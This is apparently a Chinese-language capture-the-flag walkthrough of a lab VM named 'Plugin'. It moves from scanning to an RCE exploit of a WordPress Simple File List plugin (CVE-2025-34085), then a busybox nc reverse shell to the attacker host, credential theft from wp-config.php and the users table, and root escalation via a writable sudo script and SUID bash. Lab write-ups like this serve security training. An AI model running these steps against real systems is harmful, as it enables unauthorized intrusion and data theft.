# **一、信息收集**

## **1. 主机发现**

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中扫描存活主机，确定目标。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:5f:2c:34       PCS Systemtechnik GmbH
...
```

命令输出确认了目标主机的IP地址为 `192.168.205.131`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别对外开放的服务。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果表明，目标主机开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。Web服务是主要的攻击入口。

## **3. Web信息探测**

访问 `http://192.168.205.131` 是一个 Apache 的默认页面。使用 `gobuster` 进行目录爆破，发现了多个PHP页面。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.131 -w ... -x php,txt,html
...
/index.php            (Status: 302) [Size: 0] [--> home.php]
/home.php             (Status: 200) [Size: 1954]
/about.php            (Status: 200) [Size: 1286]
/feedback.php         (Status: 200) [Size: 2189]
...
```

在浏览发现的页面时，`feedback.php` 的提交功能弹窗泄露了一个关键信息：`反馈已提交！服务端处理使用域名: plugin.dsz`。我们将此域名添加到本地 `/etc/hosts` 文件中。

配置好 `hosts` 后，使用 `nuclei` 对 `http://plugin.dsz` 进行自动化漏洞扫描，发现一个严重漏洞。

```bash
┌──(kali㉿kali)-[~]
└─$ nuclei -u http://plugin.dsz
...
[CVE-2025-34085] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/aighbdh.php
[wordpress-rce-simplefilelist] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/egafhad.php
...
```

扫描结果直指 **WordPress** 的 **Simple File List** 插件存在远程代码执行（RCE）漏洞 (CVE-2025-34085)。

## # **二、Web渗透与立足点**

## **1. RCE漏洞利用**

根据 `nuclei` 的扫描结果，我们找到了针对 `CVE-2025-34085` 的公开漏洞利用脚本。 该漏洞允许未经身份验证的攻击者上传一个伪装成图片的文件，然后将其重命名为 `.php` 文件，从而执行任意代码。

首先，使用漏洞利用脚本执行 `id` 命令，验证漏洞是否存在且可利用。

```bash
┌──(kali㉿kali)-[~/CVE-2025-34085]
└─$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd "id"
...
[DEBUG] Command Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] http://plugin.dsz | http://plugin.dsz/wp-content/uploads/simple-file-list/cttlu7x9.php
```

命令成功返回 `www-data` 用户信息，确认RCE漏洞可以利用。

## **2. Getshell**

接下来，利用该漏洞获得一个反弹shell。首先在攻击机上设置 `netcat` 监听 `8888` 端口。

然后，执行以下命令，让目标主机反弹一个 `/bin/bash` shell。

```bash
┌──(kali㉿kali)-[~/CVE-2025-34085]
└─$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd "busybox nc 192.168.205.128 8888 -e /bin/bash"
```

攻击机成功接收到反弹shell，获得了 `www-data` 用户的访问权限。

---

# **三、权限提升**

## **1. 横向移动 (www-data -> yi)**

在 `www-data` shell中，我们首先寻找数据库配置文件。在Web根目录 `/var/www/plugin.dsz/` 中，找到了 `wp-config.php` 文件。

```bash
www-data@Plugin:/var/www/plugin.dsz$ cat wp-config.php
...
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'password' );
...
```

利用泄露的数据库凭据连接到本地MariaDB数据库，并查询 `wp_users` 表。

```sql
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
| ID | user_login | user_pass                          | user_nicename | ... | user_activation_key | display_name |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
|  1 | root       | $wp$2y$10$...                       | root          | ... |                     | root         |
|  2 | yi         | b00b6ce41fbb3854fbfddcb71b5aa15d     | yi            | ... | eWl5aXlp            | eWl5aXlp     |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
```

我们发现了两个用户：`root` 和 `yi`。在 `yi` 用户的数据行中，`user_activation_key` 和 `display_name` 字段的值均为 `eWl5aXlp`。猜测这为`yi`用户密码。

使用 `su yi` 和密码 `eWl5aXlp`，成功切换到 `yi` 用户。

## **2. 提权至root (yi -> root)**

切换到 `yi` 用户后，执行 `sudo -l` 来检查其 `sudo` 权限。

```bash
yi@Plugin:~$ sudo -l
...
User yi may run the following commands on Plugin:
    (ALL) NOPASSWD: /bin/bash /home/yi/yiyi.sh
```

结果显示，`yi` 用户可以无需密码以root权限执行 `/home/yi/yiyi.sh` 脚本。由于 `yi` 用户对其家目录有写权限，我们可以轻易地替换掉这个脚本。

**提权步骤**:

1. 备份并替换原始脚本，写入一个可以为 `/bin/bash` 添加SUID权限的命令。

   ```bash
   yi@Plugin:~$ mv /home/yi/yiyi.sh /home/yi/1
   yi@Plugin:~$ echo 'chmod +s /bin/bash' > /home/yi/yiyi.sh
   ```

2. 以 `sudo` 权限执行被篡改后的脚本。

   ```bash
   yi@Plugin:~$ sudo /bin/bash /home/yi/yiyi.sh
   ```

3. 执行 `bash -p`。`-p` 参数使得 `bash` 在启动时不会放弃root权限，从而获得一个有效的root shell。

   ```bash
   yi@Plugin:~$ bash -p
   bash-5.0# id
   uid=1000(yi) gid=1000(yi) euid=0(root) egid=0(root) groups=0(root),1000(yi)
   ```

   `id` 命令的输出确认我们已成功获得root权限。

---

# **四、获取Flag**

现在我们拥有了root权限，可以读取系统上的所有敏感文件。

```bash
bash-5.0# cat /home/yi/user.txt
flag{user-058e8f474511327e5aeed4efa793033a}

bash-5.0# cat /root/root.txt
flag{root-ab9d82b9ae7d7d7256a95efe3447ec78}
```

所有Flag均已找到，渗透测试完成。